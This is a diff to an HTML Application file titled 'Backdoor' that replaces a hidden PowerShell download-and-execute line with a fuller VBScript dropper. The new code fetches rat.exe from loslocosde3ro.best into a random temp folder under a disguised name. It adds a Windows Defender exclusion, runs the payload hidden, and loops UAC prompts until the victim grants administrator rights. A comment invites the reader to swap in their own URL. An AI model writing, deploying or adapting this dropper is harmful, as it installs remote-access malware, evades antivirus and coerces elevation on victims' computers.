@@ -2,9 +2,103 @@
 <HEAD>
 <HTA:APPLICATION ID="oApp" APPLICATIONNAME="Backdoor" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" />
 <script language="VBScript">
-  Set oShell = CreateObject("Wscript.Shell")
-  oShell.Run "powershell -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString('http://loslocosde3ro.best/vemvem')", 0, False
-  window.close()
+    ' Generar nombre aleatorio para la carpeta
+    Function RandomString(length)
+        Dim chars, result, i, rndIndex
+        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+        Randomize
+        result = ""
+        For i = 1 To length
+            rndIndex = Int(Len(chars) * Rnd) + 1
+            result = result & Mid(chars, rndIndex, 1)
+        Next
+        RandomString = result
+    End Function
+    
+    ' Verificar privilegios de administrador
+    Function IsAdmin()
+        On Error Resume Next
+        CreateObject("WScript.Shell").RegRead "HKEY_USERS\S-1-5-19\Environment\TEMP"
+        IsAdmin = (Err.Number = 0)
+        Err.Clear
+    End Function
+    
+    ' Elevar privilegios persistentemente
+    Function ElevatePrivileges(exePath)
+        Dim shell, app
+        Set shell = CreateObject("WScript.Shell")
+        Set app = CreateObject("Shell.Application")
+        
+        Do
+            On Error Resume Next
+            app.ShellExecute "mshta.exe", "vbscript:Close(CreateObject(""WScript.Shell"").Run(""" & exePath & """, 0, False))", "", "runas", 1
+            If Err.Number = 0 Then Exit Do
+            Err.Clear
+            WScript.Sleep 2000
+        Loop
+    End Function
+    
+    ' Añadir excepción a Windows Defender
+    Sub AddDefenderException(path)
+        Dim psCmd
+        psCmd = "powershell -w hidden -Command ""& {"
+        psCmd = psCmd & "Start-Process powershell -ArgumentList '-Command Add-MpPreference -ExclusionPath """"" & path & """""""' "
+        psCmd = psCmd & "-Verb RunAs -WindowStyle Hidden -Wait}"
+        
+        CreateObject("WScript.Shell").Run psCmd, 0, True
+    End Sub
+    
+    ' Descargar y ejecutar payload
+    Sub RunPayload
+        Dim shell, fso, tempPath, randFolder, exePath, downloadUrl
+        
+        Set shell = CreateObject("WScript.Shell")
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        
+        ' Configurar rutas
+        tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
+        randFolder = RandomString(12)
+        exePath = tempPath & "\" & randFolder & "\system_service.exe"
+        downloadUrl = "http://loslocosde3ro.best/rat.exe"  ' Cambiar a tu URL
+        
+        ' Crear directorio aleatorio
+        If Not fso.FolderExists(tempPath & "\" & randFolder) Then
+            fso.CreateFolder tempPath & "\" & randFolder
+        End If
+        
+        ' Descargar payload
+        On Error Resume Next
+        With CreateObject("MSXML2.XMLHTTP")
+            .Open "GET", downloadUrl, False
+            .Send
+            If .Status = 200 Then
+                With CreateObject("ADODB.Stream")
+                    .Type = 1
+                    .Open
+                    .Write .responseBody
+                    .SaveToFile exePath, 2
+                    .Close
+                End With
+            End If
+        End With
+        
+        ' Añadir excepción a Defender y ejecutar
+        If fso.FileExists(exePath) Then
+            AddDefenderException tempPath & "\" & randFolder
+            
+            If IsAdmin() Then
+                shell.Run """" & exePath & """", 0, False
+            Else
+                ElevatePrivileges exePath
+            End If
+        End If
+        
+        window.close()
+    End Sub
+    
+    ' Iniciar proceso
+    On Error Resume Next
+    RunPayload
 </script>
 </HEAD>
 <BODY>
